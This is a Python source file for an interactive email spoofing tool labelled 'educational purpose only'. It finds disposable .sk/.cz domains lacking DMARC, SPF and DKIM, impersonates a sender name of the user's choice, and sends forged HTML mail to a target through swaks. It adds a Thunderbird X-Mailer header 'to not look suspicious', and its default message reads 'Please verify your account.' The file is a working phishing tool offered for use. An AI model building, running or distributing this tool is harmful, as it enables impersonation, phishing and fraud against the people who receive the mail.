# -------------------- IMPORTANT --------------------
# EDUCATIONAL PURPOSE ONLY - DEMONSTRATION OF EMAIL SECURITY VULNERABILITIES
# DO NOT USE THIS TOOL FOR MALICIOUS PURPOSES
# THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS TOOL
# ---------------------------------------------------

# THIS PROGRAM DOES (STEPS):
# - install dependencies if not present (check them if they are available)
#   - dig
#   - swaks (https://github.com/jetmore/swaks)
#   - getdmarcrecords.py (https://github.com/sirpsycho/dmarc) - included my own implementation with several changes
#   - ghostmail-collector (https://github.com/michaelshapkin/ghostmail-collector)
# - fetch list of domains with MX records from file
# - find suitable .sk or .cz domains
# - run the getdmarcrecords.py to get the DMARC, SPF and DKIM records for the domains
# - get only the domains with no DMARC, SPF or DKIM records
# - give user prompt to chose which domain to use 
# - after domain pick, let user choose the name of the sender to impersonate, the subject and body of the email and mainly the target
# - send the email using swaks

import subprocess
import sys
import shutil
from pathlib import Path
from typing import Optional

# Check for Python dependencies first (before importing them)
def check_python_dependencies_early():
    """Check if required Python packages are installed before importing"""
    missing = []
    
    try:
        import typer
    except ImportError:
        missing.append("typer")
    
    try:
        import requests
    except ImportError:
        missing.append("requests")
    
    try:
        import rich
    except ImportError:
        missing.append("rich")
    
    if missing:
        print("\n" + "="*60)
        print("ERROR: Missing Python Dependencies!")
        print("="*60)
        print(f"\nMissing packages: {', '.join(missing)}")
        print("\n--- Recommended: Use a virtual environment ---\n")
        print("1. Create virtual environment:")
        print("   python3 -m venv venv\n")
        print("2. Activate virtual environment:")
        print("   source venv/bin/activate\n")
        print("3. Install dependencies:")
        print("   pip install -r requirements.txt\n")
        print("4. Run the script:")
        print("   python3 email_tool.py interactive\n")
        print("--- Alternative: Install globally (not recommended) ---")
        print(f"   pip3 install {' '.join(missing)}\n")
        print("="*60)
        return False
    
    return True

# Check dependencies before importing
if not check_python_dependencies_early():
    sys.exit(1)

# Now safe to import
import typer
import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

console = Console()
app = typer.Typer()

# Configuration
DEPS_DIR = Path(__file__).parent / "deps"
DMARC_SCRIPT = DEPS_DIR / "dmarc" / "getdmarcrecords.py"
DISPOSABLE_EMAILS_URL = "https://raw.githubusercontent.com/michaelshapkin/ghostmail-collector/refs/heads/main/data/disposable_emails.txt"

def show_venv_instructions():
    """Show instructions for setting up virtual environment"""
    console.print("\n[bold red]╔══════════════════════════════════════════════════════════════╗[/bold red]")
    console.print("[bold red]║  Missing Python Dependencies!                               ║[/bold red]")
    console.print("[bold red]╚══════════════════════════════════════════════════════════════╝[/bold red]\n")
    
    console.print("[bold yellow]Recommended: Use a virtual environment[/bold yellow]\n")
    
    console.print("[bold cyan]Linux Setup Instructions:[/bold cyan]")
    console.print("1. Create virtual environment:")
    console.print("   [green]python3 -m venv venv[/green]\n")
    console.print("2. Activate virtual environment:")
    console.print("   [green]source venv/bin/activate[/green]\n")
    console.print("3. Install dependencies:")
    console.print("   [green]pip install -r requirements.txt[/green]\n")
    console.print("4. Run the script:")
    console.print("   [green]python3 email_tool.py interactive[/green]\n")
    
    console.print("[bold yellow]Alternative: Install globally (not recommended)[/bold yellow]")
    console.print("   [green]pip3 install -r requirements.txt[/green]\n")

def check_dependencies():
    """Check if required dependencies are installed"""
    console.print("[bold blue]Checking dependencies...[/bold blue]")
    
    # Python packages are already checked at startup, just verify again
    console.print("[bold green]✓ Python packages (typer, requests, rich) found![/bold green]")
    
    missing = []
    
    # Check dig (part of BIND tools)
    if shutil.which("dig") is None:
        missing.append("dig")
        console.print("[yellow]⚠ dig not found.[/yellow]")
        console.print("   [cyan]Install on Debian/Ubuntu:[/cyan]")
        console.print("   [green]sudo apt-get install dnsutils[/green]")
        console.print("   [cyan]Install on Arch Linux:[/cyan]")
        console.print("   [green]sudo pacman -S bind-tools[/green]")
        console.print("   [cyan]Install on Fedora/RHEL/CentOS:[/cyan]")
        console.print("   [green]sudo dnf install bind-utils[/green]\n")
    
    # Check swaks
    if shutil.which("swaks") is None:
        missing.append("swaks")
        console.print("[yellow]⚠ swaks not found.[/yellow]")
        console.print("   [cyan]Install on Debian/Ubuntu:[/cyan]")
        console.print("   [green]sudo apt-get install swaks[/green]")
        console.print("   [cyan]Install on Arch Linux:[/cyan]")
        console.print("   [green]sudo pacman -S swaks[/green]")
        console.print("   [cyan]Install on Fedora/RHEL/CentOS:[/cyan]")
        console.print("   [green]sudo dnf install swaks[/green]")
        console.print("   [cyan]Or from source:[/cyan]")
        console.print("   [green]git clone https://github.com/jetmore/swaks.git[/green]")
        console.print("   [green]cd swaks && chmod +x swaks && sudo cp swaks /usr/local/bin/[/green]\n")
    
    # Check DMARC script
    if not DMARC_SCRIPT.exists():
        missing.append("getdmarcrecords.py")
        console.print(f"[yellow]⚠ DMARC script not found at {DMARC_SCRIPT}[/yellow]")
        console.print("   Make sure the deps/dmarc directory exists with getdmarcrecords.py\n")
    
    if missing:
        console.print(f"\n[bold red]Missing system dependencies: {', '.join(missing)}[/bold red]")
        console.print("\n[bold yellow]Quick install (Debian/Ubuntu):[/bold yellow]")
        console.print("[green]sudo apt-get update && sudo apt-get install -y dnsutils swaks[/green]\n")
        return False
    
    console.print("[bold green]✓ All dependencies found![/bold green]")
    return True

def download_disposable_domains():
    """Download list of disposable email domains"""
    console.print("[bold blue]Downloading disposable email domains...[/bold blue]")
    
    try:
        response = requests.get(DISPOSABLE_EMAILS_URL, timeout=10)
        response.raise_for_status()
        domains = response.text.strip().split('\n')
        console.print(f"[green]✓ Downloaded {len(domains)} domains[/green]")
        return domains
    except Exception as e:
        console.print(f"[red]✗ Error downloading domains: {e}[/red]")
        return []

def filter_domains(domains, extensions=None):
    """Filter domains ending with specified extensions"""
    if extensions is None:
        extensions = ('.sk', '.cz')
    else:
        # Ensure extensions start with a dot
        extensions = tuple(ext if ext.startswith('.') else f'.{ext}' for ext in extensions)
    
    filtered = [d.strip() for d in domains if d.strip().endswith(extensions)]
    console.print(f"[green]✓ Found {len(filtered)} domains with extensions: {', '.join(extensions)}[/green]")
    
    console.print("\n[dim]Filtered domains:[/dim]")
    for domain in filtered:
        console.print(f"[dim]  - {domain}[/dim]")
        
    return filtered

def check_dns_records(domains):
    """Check DMARC, SPF, DKIM records for domains"""
    console.print("\n[bold blue]Checking DMARC/SPF/DKIM records...[/bold blue]")
    
    # save the domain to input file for dmarc script
    input_file_single = DEPS_DIR / "dmarc" / "input_domains_single.txt"
    
    vulnerable_domains = []
    
    for domain in domains:
        with open(input_file_single, 'w') as f:
            f.write(domain + "\n")
        try:
            # Run getdmarcrecords.py script
            result = subprocess.run(
                [sys.executable, str(DMARC_SCRIPT), "-i", str(input_file_single)],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            output = result.stdout
            
            # Parse the output more accurately
            has_dmarc = False
            has_spf = False
            has_dkim = False
            
            # Check for DMARC
            if "DMARC record not found" in output or "DMARC Record:" not in output:
                has_dmarc = False
            elif "DMARC Record:" in output:
                dmarc_section = output.split("DMARC Record:")[1].split("\n")[0:3]
                dmarc_content = "".join(dmarc_section).strip()
                has_dmarc = bool(dmarc_content) and "not found" not in dmarc_content.lower()
            
            # Check for SPF
            if "SPF record not found" in output:
                has_spf = False
            elif "SPF Record:" in output:
                spf_lines = output.split("SPF Record:")[1].split("\n")
                spf_content = []
                for line in spf_lines[1:]:
                    if line.strip() and not line.startswith("DKIM") and not line.startswith("Domain:"):
                        spf_content.append(line.strip())
                    elif line.strip().startswith("DKIM") or line.strip().startswith("---"):
                        break
                has_spf = bool(spf_content) and "not found" not in " ".join(spf_content).lower()
            
            # Check for DKIM
            if "DKIM records not found" in output or "checked common selectors" in output:
                has_dkim = False
            elif "DKIM Records:" in output:
                dkim_lines = output.split("DKIM Records:")[1].split("\n")
                dkim_content = []
                for line in dkim_lines[1:]:
                    if line.strip() and not line.startswith("---") and not line.startswith("Domain:"):
                        dkim_content.append(line.strip())
                    elif line.strip().startswith("---") or line.strip().startswith("Domain:"):
                        break
                has_dkim = bool(dkim_content) and "not found" not in " ".join(dkim_content).lower()
            
            # Domain is vulnerable if it has NO protection at all
            if not (has_dmarc or has_spf or has_dkim):
                vulnerable_domains.append(domain)
                console.print(f"[green]✓ Vulnerable: {domain} (No DMARC, SPF, or DKIM)[/green]")
            else:
                protection = []
                if has_dmarc:
                    protection.append("DMARC")
                if has_spf:
                    protection.append("SPF")
                if has_dkim:
                    protection.append("DKIM")
                console.print(f"[yellow]⚠ {domain} has protection: {', '.join(protection)}[/yellow]")
                
        except subprocess.TimeoutExpired:
            console.print(f"[yellow]⚠ Timeout checking {domain}[/yellow]")
            continue
        except Exception as e:
            console.print(f"[yellow]⚠ Error checking {domain}: {e}[/yellow]")
            continue
    
    console.print(f"\n[bold green]Found {len(vulnerable_domains)} vulnerable domains[/bold green]")
    return vulnerable_domains

def select_domain(domains):
    """Let user select a domain from the list"""
    console.print("\n[bold blue]Available vulnerable domains:[/bold blue]")
    
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("#", style="dim", width=6)
    table.add_column("Domain")
    
    for idx, domain in enumerate(domains[:20], 1):  # Show first 20
        table.add_row(str(idx), domain)
    
    console.print(table)
    
    choice = Prompt.ask(
        "Select domain number",
        default="1",
        show_default=True
    )
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(domains):
            return domains[idx]
    except ValueError:
        pass
    
    console.print("[red]Invalid selection, using first domain[/red]")
    return domains[0]

def get_email_details():
    """Get email details from user"""
    console.print("\n[bold blue]Email Configuration:[/bold blue]")
    
    sender_name = Prompt.ask("Sender name (e.g., 'Martin Peter')")
    
    # Validate target email is not empty
    target_email = ""
    while not target_email.strip():
        target_email = Prompt.ask("Target email address")
        if not target_email.strip():
            console.print("[red]Target email cannot be empty![/red]")
    
    subject = Prompt.ask("Email subject")
    
    console.print("\n[yellow]Enter email body (HTML supported). Type 'END' on a new line when done:[/yellow]")
    body_lines = []
    while True:
        line = input()
        if line.strip() == 'END':
            break
        body_lines.append(line)
    
    body = '\n'.join(body_lines)
    
    return {
        'sender_name': sender_name,
        'target_email': target_email,
        'subject': subject,
        'body': body
    }

def send_spoofed_email(domain, sender_name, sender_email, target_email, subject, body):
    """Send spoofed email using swaks"""
    console.print("\n[bold blue]Sending spoofed email...[/bold blue]")
    
    if shutil.which("swaks") is None:
        console.print("[red]swaks not found! Please install it first.[/red]")
        console.print("[green]sudo apt-get install swaks[/green]")
        return False
    
    # Prepare HTML body
    html_body = f"<html><body>{body}</body></html>"
    
    # Generate Message-Id using date command (Linux)
    timestamp = subprocess.check_output(['date', '+%s'], text=True).strip()
    message_id = f"{timestamp}.{sender_email}"
    
    # Build swaks command
    cmd = [
        "swaks",
        "--to", target_email,
        "--from", sender_email,
        "--ehlo", domain,
        "--header", f'From: "{sender_name}" <{sender_email}>',
        "--header", f"Reply-To: <{sender_email}>",
        "--header", f"Return-Path: <{sender_email}>",
        "--header", f"Message-Id: <{message_id}>",
        "--header", f"Subject: {subject}",
        "--header", "X-Mailer: Thunderbird", # to not look suspicious
        "--header", "Content-Type: text/html; charset=utf-8",
        "--header", "MIME-Version: 1.0",
        "--body", html_body
    ]
    
    # Display command being executed
    console.print(f"\n[dim]Command: {' '.join(cmd)}[/dim]\n")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        # Always show stdout
        if result.stdout:
            console.print("[bold cyan]Output:[/bold cyan]")
            console.print(result.stdout)
        
        # Show stderr if present
        if result.stderr:
            console.print("\n[bold yellow]Errors/Warnings:[/bold yellow]")
            console.print(result.stderr)
        
        if result.returncode == 0:
            console.print("\n[bold green]✓ Email sent successfully![/bold green]")
            return True
        else:
            console.print(f"\n[bold red]✗ Failed to send email (Exit code: {result.returncode})[/bold red]")
            
            # Provide helpful debugging information
            console.print("\n[yellow]Debugging Information:[/yellow]")
            console.print(f"  Domain: {domain}")
            console.print(f"  From: {sender_email}")
            console.print(f"  To: {target_email}")
            console.print(f"  Subject: {subject}")
            
            return False
            
    except subprocess.TimeoutExpired:
        console.print("[red]✗ Command timed out after 30 seconds[/red]")
        return False
    except Exception as e:
        console.print(f"[red]✗ Error sending email: {e}[/red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
        return False

@app.command()
def interactive():
    """Run the complete email spoofing workflow"""
    console.print("[bold cyan]Email Spoofing Tool - Educational Demonstration[/bold cyan]")
    console.print("[bold red]FOR EDUCATIONAL PURPOSES ONLY[/bold red]\n")
    
    # Check dependencies
    if not check_dependencies():
        console.print("\n[red]Please install missing dependencies first.[/red]")
        if not Confirm.ask("Continue anyway?"):
            return
    
    # Use custom domain ?
    use_custom_domain = Confirm.ask("\nDo you want to use a custom domain?", default=False)
    
    selected_domain = None
    if use_custom_domain:
        selected_domain = ""
        while not selected_domain.strip():
            selected_domain = Prompt.ask("Enter custom domain (e.g., example.com)")
            if not selected_domain.strip():
                console.print("[red]Custom domain cannot be empty![/red]\n")
                
        console.print(f"\n[bold green]Using custom domain: {selected_domain}[/bold green]")
    else:
        # Download disposable domains
        domains = download_disposable_domains()
        if not domains:
            console.print("[red]Failed to download domains. Exiting.[/red]")
            return
        
        # Custom domain extensions
        use_custom_extensions = Confirm.ask("\nDo you want to search for custom domain extensions? (default: .sk, .cz)", default=False)
        
        domain_extensions = None
        if use_custom_extensions:
            extensions_input = Prompt.ask("Enter domain extensions separated by comma (e.g., com,net,org)")
            domain_extensions = [ext.strip() for ext in extensions_input.split(',') if ext.strip()]
            console.print(f"[green]Searching for extensions: {', '.join(domain_extensions)}[/green]")
        
        # Filter domains by extensions
        filtered_domains = filter_domains(domains, domain_extensions)
        if not filtered_domains:
            console.print(f"[red]No domains found with specified extensions. Exiting.[/red]")
            return
        
        # Check DMARC/SPF/DKIM records
        vulnerable_domains = check_dns_records(filtered_domains)
        if not vulnerable_domains:
            console.print("[red]No vulnerable domains found. Exiting.[/red]")
            return
        
        # Select domain
        selected_domain = select_domain(vulnerable_domains)
        console.print(f"\n[bold green]Selected domain: {selected_domain}[/bold green]")
    
    # Get email details
    email_details = get_email_details()
    sender_email = f"{email_details['sender_name'].lower().replace(' ', '')}@{selected_domain}"
    
    # Send email
    console.print(f"\n[bold yellow]═══════════════════════════════════════[/bold yellow]")
    console.print(f"[bold yellow]Email Summary:[/bold yellow]")
    console.print(f"[bold yellow]═══════════════════════════════════════[/bold yellow]")
    console.print(f"From: {email_details['sender_name']} <{sender_email}>")
    console.print(f"To: {email_details['target_email']}")
    console.print(f"Subject: {email_details['subject']}")
    console.print(f"[bold yellow]═══════════════════════════════════════[/bold yellow]\n")
    
    if Confirm.ask("Send email?"):
        send_spoofed_email(
            selected_domain,
            email_details['sender_name'],
            sender_email,
            email_details['target_email'],
            email_details['subject'],
            email_details['body']
        )

@app.command()
def send(
    target: str = typer.Argument(..., help="Target email address"),
    domain: Optional[str] = typer.Option(None, help="Spoofed domain"),
    sender_name: str = typer.Option("Admin", help="Sender name"),
    subject: str = typer.Option("Important Notice", help="Email subject"),
    body: str = typer.Option("Please verify your account.", help="Email body")
):
    """Send a single spoofed email with specified parameters"""
    
    if not domain:
        console.print("[yellow]No domain specified, finding vulnerable domain...[/yellow]")
        domains = download_disposable_domains()
        filtered = filter_domains(domains)
        vulnerable = check_dns_records(filtered[:10])
        if vulnerable:
            domain = vulnerable[0]
        else:
            console.print("[red]No vulnerable domain found[/red]")
            return
    
    sender_email = f"{sender_name.lower().replace(' ', '')}@{domain}"
    
    send_spoofed_email(domain, sender_name, sender_email, target, subject, body)

@app.command()
def check():
    """Check dependencies only"""
    check_dependencies()

if __name__ == "__main__":
    app()